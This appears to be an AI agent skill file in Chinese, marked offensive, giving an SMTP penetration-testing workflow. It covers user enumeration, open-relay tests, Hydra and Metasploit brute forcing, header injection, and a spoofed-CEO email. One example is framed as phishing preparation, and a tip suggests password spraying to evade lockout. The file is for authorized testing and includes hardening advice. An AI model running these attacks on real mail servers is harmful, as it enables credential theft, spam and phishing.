---
name: smtp-penetration-testing
description: "对 SMTP（简单邮件传输协议）服务器进行全面安全评估，识别开放中继、用户枚举、弱认证和配置错误等漏洞。触发词：SMTP渗透测试、SMTP安全评估、邮件服务器安全、开放中继测试、SMTP用户枚举、SMTP暴力破解"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权安全评估、防御性验证或受控教育环境。

# SMTP 渗透测试

## 目的

对 SMTP（简单邮件传输协议）服务器进行全面安全评估，识别开放中继、用户枚举、弱认证和配置错误等漏洞。本技能涵盖 Banner 抓取、用户枚举技术、中继测试、暴力破解攻击和安全加固建议。

## 前置条件

### 所需工具
```bash
# 带 SMTP 脚本的 Nmap
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra 用于暴力破解
sudo apt-get install hydra

# SMTP 用户枚举工具
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### 所需知识
- SMTP 协议基础
- 邮件架构（MTA、MDA、MUA）
- DNS 和 MX 记录
- 网络协议

### 所需访问权限
- 目标 SMTP 服务器 IP/主机名
- 书面测试授权
- 用于枚举和暴力破解的字典文件

## 输出与交付物

1. **SMTP 安全评估报告** — 全面的漏洞发现
2. **用户枚举结果** — 发现的有效邮箱地址
3. **中继测试结果** — 开放中继状态及利用潜力
4. **修复建议** — 安全加固指导

## 核心工作流

### 阶段 1：SMTP 架构理解

```
组件：MTA（传输）→ MDA（投递）→ MUA（客户端）

端口：25（SMTP）、465（SMTPS）、587（submission）、2525（备选）

工作流：发件人 MUA → 发件人 MTA → DNS/MX → 收件人 MTA → MDA → 收件人 MUA
```

### 阶段 2：SMTP 服务发现

识别 SMTP 服务器及版本：

```bash
# 发现 SMTP 端口
nmap -p 25,465,587,2525 -sV TARGET_IP

# 激进服务检测
nmap -sV -sC -p 25 TARGET_IP

# SMTP 专用脚本
nmap --script=smtp-* -p 25 TARGET_IP

# 发现域名的 MX 记录
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### 阶段 3：Banner 抓取

获取 SMTP 服务器信息：

```bash
# 使用 Telnet
telnet TARGET_IP 25
# 响应：220 mail.target.com ESMTP Postfix

# 使用 Netcat
nc TARGET_IP 25
# 响应：220 mail.target.com ESMTP

# 使用 Nmap
nmap -sV -p 25 TARGET_IP
# 版本检测提取 Banner 信息

# 手动 SMTP 命令
EHLO test
# 响应揭示支持的扩展
```

解析 Banner 信息：

```
Banner 揭示：
- 服务器软件（Postfix、Sendmail、Exchange）
- 版本信息
- 主机名
- 支持的 SMTP 扩展（STARTTLS、AUTH 等）
```

### 阶段 4：SMTP 命令枚举

测试可用的 SMTP 命令：

```bash
# 连接并测试命令
nc TARGET_IP 25

# 初始问候
EHLO attacker.com

# 响应显示功能：
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

关键测试命令：

```bash
# VRFY - 验证用户是否存在
VRFY admin
250 2.1.5 admin@target.com

# EXPN - 展开邮件列表
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - 收件人验证
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = 用户存在
# 550 = 用户不存在
```

### 阶段 5：用户枚举

枚举有效邮箱地址：

```bash
# 使用 smtp-user-enum 的 VRFY 方法
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# 使用 EXPN 方法
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# 使用 RCPT 方法
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# 指定端口和域名
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

使用 Metasploit：

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

使用 Nmap：

```bash
# SMTP 用户枚举脚本
nmap --script smtp-enum-users -p 25 TARGET_IP

# 使用自定义用户列表
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### 阶段 6：开放中继测试

测试未授权邮件中继：

```bash
# 使用 Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# 通过 Telnet 手动测试
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# 如果被接受（250 OK），则服务器为开放中继
```

使用 Metasploit：

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

测试变体：

```bash
# 测试不同的发件人/收件人组合
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### 阶段 7：暴力破解认证

测试弱 SMTP 凭据：

```bash
# 使用 Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# 指定端口和 SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# 多用户测试
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# 详细输出
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

使用 Medusa：

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

使用 Metasploit：

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### 阶段 8：SMTP 命令注入

测试命令注入漏洞：

```bash
# 头部注入测试
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

邮件伪造测试：

```bash
# 伪造发件人（测试 SPF/DKIM 保护）
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```

### 阶段 9：TLS/SSL 安全测试

测试加密配置：

```bash
# STARTTLS 支持检查
openssl s_client -connect TARGET_IP:25 -starttls smtp

# 直接 SSL（端口 465）
openssl s_client -connect TARGET_IP:465

# 密码套件枚举
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### 阶段 10：SPF、DKIM、DMARC 分析

检查邮件认证记录：

```bash
# SPF/DKIM/DMARC 记录查询
dig TXT target.com | grep spf            # SPF
dig TXT selector._domainkey.target.com    # DKIM
dig TXT _dmarc.target.com                 # DMARC

# SPF 策略：-all = 严格失败，~all = 软失败，?all = 中性
```

## 快速参考

### 基本 SMTP 命令

| 命令 | 用途 | 示例 |
|------|------|------|
| HELO | 标识客户端 | `HELO client.com` |
| EHLO | 扩展 HELO | `EHLO client.com` |
| MAIL FROM | 设置发件人 | `MAIL FROM:<sender@test.com>` |
| RCPT TO | 设置收件人 | `RCPT TO:<user@target.com>` |
| DATA | 开始消息正文 | `DATA` |
| VRFY | 验证用户 | `VRFY admin` |
| EXPN | 展开别名 | `EXPN staff` |
| QUIT | 结束会话 | `QUIT` |

### SMTP 响应码

| 代码 | 含义 |
|------|------|
| 220 | 服务就绪 |
| 221 | 关闭连接 |
| 250 | OK / 请求的操作已完成 |
| 354 | 开始输入邮件 |
| 421 | 服务不可用 |
| 450 | 邮箱不可用 |
| 550 | 用户未知 / 邮箱未找到 |
| 553 | 邮箱名称不允许 |

### 枚举工具命令

| 工具 | 命令 |
|------|------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` 然后手动输入命令 |

### 常见漏洞

| 漏洞 | 风险 | 测试方法 |
|------|------|----------|
| 开放中继 | 高 | 使用外部收件人进行中继测试 |
| 用户枚举 | 中 | VRFY/EXPN/RCPT 命令 |
| Banner 泄露 | 低 | Banner 抓取 |
| 弱认证 | 高 | 暴力破解攻击 |
| 无 TLS | 中 | STARTTLS 测试 |
| 缺少 SPF/DKIM | 中 | DNS 记录查询 |

## 约束与限制

### 法律要求
- 仅测试你拥有或已获授权的 SMTP 服务器
- 发送垃圾邮件或恶意邮件属于违法行为
- 记录所有测试活动
- 不得滥用发现的开放中继

### 技术限制
- 现代服务器通常禁用 VRFY/EXPN
- 速率限制可能减慢枚举速度
- 某些服务器对有效/无效用户返回相同响应
- 灰名单可能延迟枚举响应

### 道德边界
- 绝不通过发现的中继发送实际垃圾邮件
- 不得收集邮箱地址用于恶意用途
- 将开放中继报告给服务器管理员
- 仅将发现用于授权的安全改进

## 示例

### 示例 1：完整 SMTP 评估

**场景：** 邮件服务器的全面安全评估

```bash
# 步骤 1：服务发现
nmap -sV -sC -p 25,465,587 mail.target.com

# 步骤 2：Banner 抓取
nc mail.target.com 25
EHLO test.com
QUIT

# 步骤 3：用户枚举
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# 步骤 4：开放中继测试
nmap -p 25 --script smtp-open-relay mail.target.com

# 步骤 5：认证测试
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# 步骤 6：TLS 检查
openssl s_client -connect mail.target.com:25 -starttls smtp

# 步骤 7：检查邮件认证
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### 示例 2：用户枚举攻击

**场景：** 枚举有效用户以准备钓鱼攻击

```bash
# 方法 1：VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# 方法 2：带时间分析的 RCPT
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# 方法 3：Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# 结果显示有效用户
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### 示例 3：开放中继利用

**场景：** 测试并记录开放中继漏洞

```bash
# 通过 Telnet 测试
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# 如果返回 250 OK - 存在漏洞

# 使用 Nmap 记录
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# 输出：
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## 故障排除

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 连接被拒绝 | 端口被阻止或关闭 | 使用 nmap 检查端口；ISP 可能阻止端口 25；尝试 587/465；使用 VPN |
| VRFY/EXPN 被禁用 | 服务器已加固 | 使用 RCPT TO 方法；分析响应时间/代码差异 |
| 暴力破解被阻止 | 速率限制/锁定 | 降低速度（`hydra -W 5`）；使用密码喷洒；检查 fail2ban |
| SSL/TLS 错误 | 端口或协议错误 | SSL 使用 465，STARTTLS 使用 25/587；验证 EHLO 响应 |

## 安全建议

### 管理员建议

1. **禁用开放中继** — 外部投递需认证
2. **禁用 VRFY/EXPN** — 防止用户枚举
3. **强制 TLS** — 所有连接要求 STARTTLS
4. **实施 SPF/DKIM/DMARC** — 防止邮件伪造
5. **速率限制** — 防止暴力破解攻击
6. **账户锁定** — 多次失败后锁定账户
7. **Banner 加固** — 最小化服务器信息泄露
8. **日志监控** — 对可疑活动发出警报
9. **补丁管理** — 保持 SMTP 软件更新
10. **访问控制** — 限制 SMTP 仅允许授权 IP

## 使用场景
本技能适用于执行概述中描述的工作流或操作。
